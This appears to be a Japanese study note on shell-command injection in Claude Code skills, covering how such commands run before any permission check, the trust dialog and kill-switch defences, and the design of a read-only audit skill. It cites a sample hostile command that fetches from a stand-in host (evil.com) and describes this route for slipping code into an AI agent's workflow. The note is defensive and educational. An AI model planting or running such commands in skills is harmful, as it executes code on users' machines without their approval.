# Skill のシェルインジェクションと監査スキル（audit-skill）

> 種別: ユーザー議論・Q&A の記録（Phase 3 / トピック 02-skills-deep-dive）
> 関連トピック: [02-skills-deep-dive/index.md](../index.md)（[HTML](../index.html)）

## 論点

Skills の「ダイナミックコンテキストインジェクション」`` !`command` `` は、Claude が本文を読む前にシェルを実行する前処理である。ここから「悪意あるスキルに `` !`wget evil.com` `` のような破壊的コマンドが仕込めるのでは？」という疑問が生まれ、(1) 実際にそれが可能か、(2) どう防ぐか、(3) 危険なスキルを見分ける手段はあるか、を議論した。最終的に「危険スキルを静的監査する自作スキル `audit-skill`」を設計・実装・テストするところまで進めた。

## Q&A

**Q1: `${CLAUDE_SESSION_ID}` のような変数は、ダイナミックコンテキストインジェクションのこと？**

別物。どちらも「Claude が本文を読む前に埋め込まれる前処理」という共通点があるため紛らわしいが、仕組みが違う。

- **文字列置換**（`$ARGUMENTS` / `$0` / `${CLAUDE_SESSION_ID}` / `${CLAUDE_SKILL_DIR}`）= 既知の値にそのまま差し替えるテンプレート展開。**コマンドは実行しない**。
- **ダイナミックコンテキストインジェクション**（`` !`command` `` ）= シェルコマンドを**実際に実行して、その標準出力**を本文に注入する。

つまり「値の差し込み（静的）」か「コマンド実行結果の差し込み（動的）」かが分かれ目。なお両者とも SKILL.md をレンダリングする瞬間にだけ解決される機能で、**素のシェルの環境変数ではない**（普通のターミナルで `echo ${CLAUDE_SESSION_ID}` しても空になる）。

**Q2: 変なスキルに `` !`wget evil.com` `` とか書いてあって実行されることがある？**

ある。そして公式 docs も明確に警告している。重要なのは、これは「Claude が判断して実行」ではない点。普通の Bash 実行は「Claude がツールを呼ぶ → permission 判定」を通るが、ダイナミックインジェクションは **Claude Code が前処理として実行**してしまう（"Each `` !`<command>` `` executes immediately (before Claude sees anything)" / "This is preprocessing, not something Claude executes."）。つまり **per-command の permission プロンプトが挟まらない**。

防御は3層：

1. **ワークスペース信頼ダイアログ（最重要の関門）**: project の `.claude/skills/` のスキル（と `allowed-tools`）は、ワークスペースを信頼してからでないと有効化されない。docs は "Review project skills before trusting a repository" と明記。clone した瞬間に走るわけではなく、「信頼する」と承認した時点で効く。
2. **`disableSkillShellExecution: true`（キルスイッチ）**: user/project/plugin 由来の `` !`command` `` を一律無効化し、`[shell command execution disabled by policy]` に置換。**bundled / managed は対象外**。managed settings に入れればユーザーは解除できない。
3. **信頼ティア**: bundled / managed（公式・組織配布）は信頼済みでキルスイッチ対象外。user / project / plugin は制御対象。「外から来たものほど縛れる」設計。

実行タイミングは **invoke（本文ロード）時**で、セッション開始時ではない（開始時に乗るのは説明文だけ）。ただし自動起動可なら Claude が呼んで発火し得るので、人間の関門（信頼ダイアログ・中身確認）が効いてくる。

**Q3: `/skill-name:fork` のように呼べば fork 実行になる？**

ならない。`context: fork` は「呼ぶときのオプション」ではなく「Skill 側のフロントマターに焼き込む性質」。使う側は普通に `/skill-name` と打つだけで、定義により自動的に subagent として走る。また `/a:b` の `:` は **プラグインの名前空間**（plugin:skill）を表すので、`/skill-name:fork` は「`skill-name` プラグインの `fork` スキル」という別物になる。

**Q4: `agent: Explore` などの値は何？プリセットの context？**

正確には「プリセットの subagent タイプ（職種テンプレ）」。プリセットされているのは context の中身（記憶）ではなく、**システムプロンプト（人格）＋使えるツール（権限）＋役割**。context window 自体は subagent なので毎回別枠で立つ。

- **Explore**: 調査屋。多数ファイル横断で「どこに何があるか」。**読み取り専用**。
- **Plan**: 設計屋。実装方針・トレードオフ。**読み取り専用**。
- **general-purpose**: 何でも屋。**全ツール（編集・実行含む）**。

`agent:` には自作カスタム subagent も指定できる。

**Q5: 危険なスキルを見分けるスキルは無いの？**

専用の「危険スキル検出スキル」は（公式には）見当たらない。近いのは `/security-review`（差分のレビュー）・ワークスペース信頼ダイアログ・`disableSkillShellExecution`。いずれも「人間の信頼判断 ＋ 全面キルスイッチ」が中心で、"危険度を見分ける" は手薄。→ ここに自作の余地があり、`audit-skill` を作った。

## 結論 / 整理

- インジェクション = **コマンド実行の注入**、置換 = **値の差し込み**。混同しない。
- インジェクションは **permission を経ずに前処理として走る**。だから防御の中心は「実行時の許可」ではなく **「信頼ダイアログ（人間の関門）＋ disableSkillShellExecution」**。
- これは Phase 2 の「`autoMemoryDirectory` がなぜ user 限定か（clone した悪意リポが project settings を仕込む攻撃）」と同じ穴 = **「プロジェクト由来の設定は、信頼していないリポでは攻撃面になる」** という Claude Code 全体の思想。
- 監査スキルの設計原則（実装で得た学び）:
  - **読むだけ（Read/Grep）・対象を invoke しない**。テキスト読みなら注入は発火しないので静的スキャンは安全。
  - 危ない「読む」工程だけ **Explore subagent に隔離**（丸ごと fork せず、危険工程だけ隔離するコンテキスト工学の応用）。
  - 監査スキル自身が**自己発火しない**よう、注入例を生の `` !`...` `` で書かず英文説明に置換する。
  - `allowed-tools` は `Bash(*)` のような広すぎ指定を避け、必要な操作だけ狭く事前承認（自分が監査で減点されない作り）。

## 比較表 / 具体例

### 文字列置換 vs ダイナミックコンテキストインジェクション

| | 文字列置換 | ダイナミックインジェクション |
|---|---|---|
| 構文 | `$ARGUMENTS` `${CLAUDE_SESSION_ID}` `${CLAUDE_SKILL_DIR}` | `` !`command` `` |
| 何が起きる | 既知の値に差し替え | シェル実行して stdout を注入 |
| permission | — | **挟まらない（前処理で実行）** |
| 実行タイミング | レンダリング時 | レンダリング（invoke）時 |

### audit-skill v1 の設計（実装した形）

- 置き場所: `.claude/skills/audit-skill/SKILL.md`（project スコープ、**大文字 SKILL.md**）
- フロントマター: `disable-model-invocation: true`（手動 `/audit-skill` 専用）、`argument-hint: <skill-name> | <plugin-name> [--md | --html | --html:localhost]`、`allowed-tools` は `Write` / `Bash(mkdir -p *)` / `Bash(python3 -m http.server *)` / `Bash(open http://localhost:*)` を狭く事前承認、`model` は付けない（opus 固定はコストの罠＝復習キュー Q5）
- 本文: 安全規約（読むだけ・invoke 禁止・理由）→ 入力解決（`$ARGUMENTS`）→ **Explore subagent で読む・解析** → 日本語レポート（重大度つき）→ 出力3モード（md / html / localhost）。出力は日本語固定。
- `--html:localhost`: note 風 HTML を `audit-reports/<name>.html` に書き出し、`127.0.0.1` バインドで `audit-reports/` のみ配信、ブラウザを開く（サーバ起動は副作用と本文に注記）。

## よくある誤解

- **誤解: `${CLAUDE_SESSION_ID}` は普通のシェル環境変数。**
  - 実際: SKILL.md レンダリング時のみ展開される。素のシェルでは空。
- **誤解: `` !`cmd` `` は Claude が判断してから実行する。**
  - 実際: Claude Code が前処理として permission 無しで実行する。
- **誤解: `/skill-name:fork` のように打てば fork できる。**
  - 実際: `context: fork` はフロントマターに焼き込む性質。`:` はプラグイン名前空間。
- **誤解: 監査スキルは安全（読むだけだから）なので何でも実行してよい。**
  - 実際: 監査スキル自身も、注入例を生で書くと invoke 時に自己発火し得る。生の `` !`...` `` を本文に置かない。

## 参考文献

- [Extend Claude with skills — Inject dynamic context / Pre-approve tools for a skill](https://code.claude.com/docs/en/skills#inject-dynamic-context) - `` !`command` `` の実行タイミング、`disableSkillShellExecution`、信頼ダイアログ（閲覧日 2026-06-19）
- [Claude Code Hooks reference](https://code.claude.com/docs/en/hooks) - 全 hook イベント一覧（プラグイン install/reload 用イベントは無い、ConfigChange の matcher に skills あり、SessionStart の matcher）（閲覧日 2026-06-19）
- [Extend Claude Code — Hook vs Skill（強制 vs 推論任せ）](https://code.claude.com/docs/en/features-overview) - 「お願い（CLAUDE.md/Skill）」と「強制（Hook）」の対比（閲覧日 2026-06-19）

---

_Saved at 2026-06-19 via /learning-flow:reference_
